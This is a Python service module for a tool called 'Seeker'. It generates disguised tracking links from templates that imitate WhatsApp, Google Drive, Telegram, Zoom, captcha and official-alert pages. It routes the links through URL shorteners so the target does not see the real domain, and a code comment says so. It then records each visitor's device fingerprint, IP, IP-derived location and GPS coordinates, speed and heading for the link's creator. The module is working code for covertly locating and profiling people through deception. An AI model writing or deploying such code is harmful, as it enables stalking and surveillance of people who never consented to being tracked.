"""Seeker service for geolocation/device-info collection."""

from __future__ import annotations

import logging
from typing import Any

import httpx
from beanie import PydanticObjectId

from app.core.config import settings
from app.core.logging import hash_identifier
from app.models.history import HistorySourceResult
from app.models.seeker import SeekerLink, SeekerResult, _generate_short_code
from app.services.history_service import HistoryService
from app.services.integrations.ip_lookup.vpnapi_service import VPNAPIService

logger = logging.getLogger(__name__)

VALID_TEMPLATES = {
    "nearyou",
    "gdrive",
    "whatsapp",
    "telegram",
    "zoom",
    "captcha",
    "secure_briefing",
    "clearance_check",
    "secure_message",
    "official_alert",
}


def get_client_ip(request: Any) -> str:
    """Extract client IP from request headers (proxy-aware)."""
    for header in ("cf-connecting-ip", "x-forwarded-for", "x-real-ip"):
        val = request.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


class SeekerService:
    """Service for Seeker link creation and result storage."""

    def __init__(self, db: Any = None) -> None:
        self.db = db
        self.history_service = HistoryService()
        self._vpnapi: VPNAPIService | None = (
            VPNAPIService() if settings.SEEKER_IP_RECON_SERVICE == "vpnapi" else None
        )

    async def create_link(
        self,
        user_id: str,
        template: str,
        title: str | None = None,
        redirect_url: str | None = None,
        server_base_url: str | None = None,
    ) -> SeekerLink:
        """Create a new Seeker tracking link."""
        if template not in VALID_TEMPLATES:
            raise ValueError(f"Invalid template. Must be one of: {VALID_TEMPLATES}")

        short_code = _generate_short_code()
        for _ in range(5):  # retry on collision
            existing = await SeekerLink.find_one(SeekerLink.shortCode == short_code)
            if not existing:
                break
            short_code = _generate_short_code()

        link = SeekerLink(
            userId=PydanticObjectId(user_id),
            template=template,
            title=title,
            redirectUrl=redirect_url,
            shortCode=short_code,
        )
        await link.insert()

        # Optionally create anonymized URL via v.gd/is.gd/tinyurl - target sees their domain, not ours
        if server_base_url and settings.SEEKER_ANONYMIZE_URL_SERVICE:
            long_url = f"{server_base_url.rstrip('/')}/seeker/{link.id}/{link.template}"
            external_url = await self._create_anonymized_url(long_url)
            if external_url:
                link.externalUrl = external_url
                await link.replace()
                logger.info(
                    "Seeker link anonymized",
                    extra={
                        "link_id": str(link.id),
                        "service": settings.SEEKER_ANONYMIZE_URL_SERVICE,
                    },
                )

        logger.info(
            "Seeker link created",
            extra={"link_id": str(link.id), "user_id": user_id, "template": template},
        )
        return link

    async def _create_anonymized_url(self, long_url: str) -> str | None:
        """Create anonymized short URL via v.gd/is.gd/tinyurl. Returns URL or None on failure."""
        svc = (settings.SEEKER_ANONYMIZE_URL_SERVICE or "").lower().strip()
        if not svc:
            return None

        try:
            if svc in ("v.gd", "vgd"):
                api_url = "https://v.gd/create.php"
            elif svc in ("is.gd", "isgd"):
                api_url = "https://is.gd/create.php"
            elif svc == "tinyurl" and settings.TINYURL_API_KEY:
                return await self._create_tinyurl(long_url)
            else:
                return None

            if svc in ("v.gd", "vgd", "is.gd", "isgd"):
                async with httpx.AsyncClient(timeout=10.0) as client:
                    r = await client.get(
                        api_url,
                        params={"format": "simple", "url": long_url},
                    )
                    if r.status_code == 200 and r.text:
                        return r.text.strip()
            return None
        except Exception as e:
            logger.warning(
                "Anonymized URL creation failed",
                extra={"service": svc, "exception": type(e).__name__},
            )
            return None

    async def _create_tinyurl(self, long_url: str) -> str | None:
        """Create short URL via TinyURL API."""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                r = await client.post(
                    "https://api.tinyurl.com/create",
                    json={"url": long_url},
                    headers={
                        "Authorization": f"Bearer {settings.TINYURL_API_KEY}",
                        "Content-Type": "application/json",
                    },
                )
                if r.status_code == 200:
                    data = r.json()
                    return data.get("data", {}).get("tiny_url")
        except Exception as e:
            logger.warning(
                "TinyURL creation failed",
                extra={"exception": type(e).__name__},
            )
        return None

    async def get_link(self, link_id: str) -> SeekerLink | None:
        """Get Seeker link by ID."""
        try:
            return await SeekerLink.get(PydanticObjectId(link_id))
        except Exception:
            return None

    async def get_link_by_short_code(self, short_code: str) -> SeekerLink | None:
        """Get Seeker link by short code."""
        return await SeekerLink.find_one(SeekerLink.shortCode == short_code)

    async def get_links_by_user(
        self,
        user_id: str,
        *,
        limit: int = 20,
        skip: int = 0,
    ) -> tuple[list[SeekerLink], int]:
        """List Seeker links for a user."""
        cursor = SeekerLink.find(SeekerLink.userId == PydanticObjectId(user_id)).sort(
            "-createdAt"
        )
        total = await cursor.count()
        items = await cursor.skip(skip).limit(limit).to_list()
        return items, total

    async def delete_link(self, link_id: str, user_id: str) -> bool:
        """Delete Seeker link if owned by user."""
        link = await self.get_link(link_id)
        if not link:
            return False
        if str(link.userId) != user_id:
            raise PermissionError("Access denied")
        await link.delete()
        logger.info(
            "Seeker link deleted",
            extra={"link_id": link_id, "user_id": user_id},
        )
        return True

    async def store_device_info(
        self,
        link_id: str,
        client_ip: str,
        form_data: dict[str, str],
    ) -> SeekerResult:
        """Store device info from info endpoint (creates pending result)."""
        link = await self.get_link(link_id)
        if not link:
            raise ValueError("Link not found")

        result = SeekerResult(
            linkId=PydanticObjectId(link_id),
            platform=form_data.get("Ptf"),
            browser=form_data.get("Brw"),
            cores=form_data.get("Cc"),
            ram=form_data.get("Ram"),
            vendor=form_data.get("Ven"),
            render=form_data.get("Ren"),
            wd=form_data.get("Wd"),
            ht=form_data.get("Ht"),
            os=form_data.get("Os"),
            ip=client_ip,
            status="pending",
        )
        await result.insert()

        # Optionally fetch IP recon
        ip_info = await self._fetch_ip_info(client_ip)
        if ip_info:
            result.ipInfo = ip_info
            await result.replace()

        logger.info(
            "Seeker device info received",
            extra={"link_id": link_id, "ip_hash": hash_identifier(client_ip)},
        )
        return result

    async def store_location_result(
        self,
        link_id: str,
        client_ip: str,
        form_data: dict[str, str],
    ) -> SeekerResult:
        """Store location (success or error) and merge with pending device info."""
        link = await self.get_link(link_id)
        if not link:
            raise ValueError("Link not found")

        status = form_data.get("Status", "failed")
        is_success = status.lower() == "success"

        # Find pending result for this link with matching IP (most recent first)
        candidates = (
            await SeekerResult.find(
                SeekerResult.linkId == PydanticObjectId(link_id),
                SeekerResult.ip == client_ip,
                SeekerResult.status == "pending",
            )
            .sort("-createdAt")
            .limit(1)
            .to_list()
        )
        pending = candidates[0] if candidates else None

        if pending:
            result = pending
            result.lat = form_data.get("Lat")
            result.lon = form_data.get("Lon")
            result.acc = form_data.get("Acc")
            result.alt = form_data.get("Alt")
            result.dir = form_data.get("Dir")
            result.spd = form_data.get("Spd")
            result.error = form_data.get("Error")
            result.status = "success" if is_success else "failed"
            await result.replace()
        else:
            # No pending - create new result with location only
            result = SeekerResult(
                linkId=PydanticObjectId(link_id),
                ip=client_ip,
                lat=form_data.get("Lat"),
                lon=form_data.get("Lon"),
                acc=form_data.get("Acc"),
                alt=form_data.get("Alt"),
                dir=form_data.get("Dir"),
                spd=form_data.get("Spd"),
                error=form_data.get("Error"),
                status="success" if is_success else "failed",
            )
            ip_info = await self._fetch_ip_info(client_ip)
            if ip_info:
                result.ipInfo = ip_info
            await result.insert()

        # Create History record for user's history list
        await self._create_history_for_result(link, result)

        logger.info(
            "Seeker location result received",
            extra={
                "link_id": link_id,
                "ip_hash": hash_identifier(client_ip),
                "status": result.status,
            },
        )
        return result

    async def _fetch_ip_info(self, ip: str) -> dict[str, Any] | None:
        """Fetch IP geolocation/recon info."""
        # Skip private IPs
        if ip.startswith("10.") or ip.startswith("172.") or ip == "127.0.0.1":
            return None
        if ip.startswith("192.168.") or ip == "::1":
            return None

        try:
            if settings.SEEKER_IP_RECON_SERVICE == "vpnapi" and self._vpnapi:
                resp = await self._vpnapi.search_ip(ip)
                if resp.get("found") and resp.get("data"):
                    return resp["data"]
            else:
                # ipwhois.app (free, no key)
                async with httpx.AsyncClient(timeout=10.0) as client:
                    r = await client.get(f"https://ipwhois.app/json/{ip}")
                    if r.status_code == 200:
                        data = r.json()
                        return {
                            "continent": data.get("continent", ""),
                            "country": data.get("country", ""),
                            "region": data.get("region", ""),
                            "city": data.get("city", ""),
                            "org": data.get("org", ""),
                            "isp": data.get("isp", ""),
                        }
        except Exception as e:
            logger.warning(
                "IP recon skipped or failed",
                extra={"ip_hash": hash_identifier(ip), "exception": type(e).__name__},
            )
        return None

    def _result_to_flattened(self, result: SeekerResult) -> list[dict[str, Any]]:
        """Convert SeekerResult to flattened format for History."""
        items: list[dict[str, Any]] = []
        # Device info
        for key, label in [
            ("platform", "Platform"),
            ("browser", "Browser"),
            ("os", "OS"),
            ("cores", "CPU Cores"),
            ("ram", "RAM"),
            ("vendor", "GPU Vendor"),
            ("render", "GPU"),
            ("wd", "Width"),
            ("ht", "Height"),
        ]:
            val = getattr(result, key, None)
            if val:
                items.append({"key": label, "value": val})
        # IP
        items.append({"key": "Public IP", "value": result.ip})
        # IP info
        if result.ipInfo:
            for k, v in result.ipInfo.items():
                if v:
                    items.append({"key": k.title(), "value": str(v)})
        # Location
        if result.status == "success" and result.lat and result.lon:
            items.append({"key": "Latitude", "value": result.lat})
            items.append({"key": "Longitude", "value": result.lon})
            items.append(
                {
                    "key": "Google Maps",
                    "value": f"https://www.google.com/maps/place/{result.lat}+{result.lon}",
                }
            )
            for key, label in [
                ("acc", "Accuracy"),
                ("alt", "Altitude"),
                ("dir", "Direction"),
                ("spd", "Speed"),
            ]:
                val = getattr(result, key, None)
                if val:
                    items.append({"key": label, "value": val})
        elif result.error:
            items.append({"key": "Location Error", "value": result.error})
        return items

    async def _create_history_for_result(
        self, link: SeekerLink, result: SeekerResult
    ) -> None:
        """Create History record so result appears in user's history list."""
        if not link.userId:
            return

        try:
            flattened = self._result_to_flattened(result)
            history = await self.history_service.create_history(
                user_id=link.userId,
                query_type="seeker-lookup",
                query_input={"link_id": str(link.id), "template": link.template},
            )
            history_result = HistorySourceResult(
                source="seeker",
                success=result.status == "success",
                data={
                    "platform": result.platform,
                    "browser": result.browser,
                    "ip": result.ip,
                    "ipInfo": result.ipInfo,
                    "lat": result.lat,
                    "lon": result.lon,
                    "accuracy": result.acc,
                    "error": result.error,
                },
                message=result.error if result.status == "failed" else None,
            )
            await self.history_service.add_result(history.id, history_result)
            await self.history_service.finalize_history(
                history.id,
                total_sources=1,
                flattened_results=flattened,
            )
            logger.info(
                "History created for Seeker result",
                extra={"history_id": str(history.id), "link_id": str(link.id)},
            )
        except Exception as e:
            logger.warning(
                "Failed to create history for Seeker result",
                extra={"link_id": str(link.id), "exception": type(e).__name__},
            )

    async def get_results_by_link(
        self,
        link_id: str,
        user_id: str,
        *,
        limit: int = 50,
        skip: int = 0,
    ) -> tuple[list[SeekerResult], int]:
        """Get Seeker results for a link (ownership checked by caller)."""
        link = await self.get_link(link_id)
        if not link or str(link.userId) != user_id:
            return [], 0

        cursor = SeekerResult.find(
            SeekerResult.linkId == PydanticObjectId(link_id)
        ).sort("-createdAt")
        total = await cursor.count()
        items = await cursor.skip(skip).limit(limit).to_list()
        return items, total
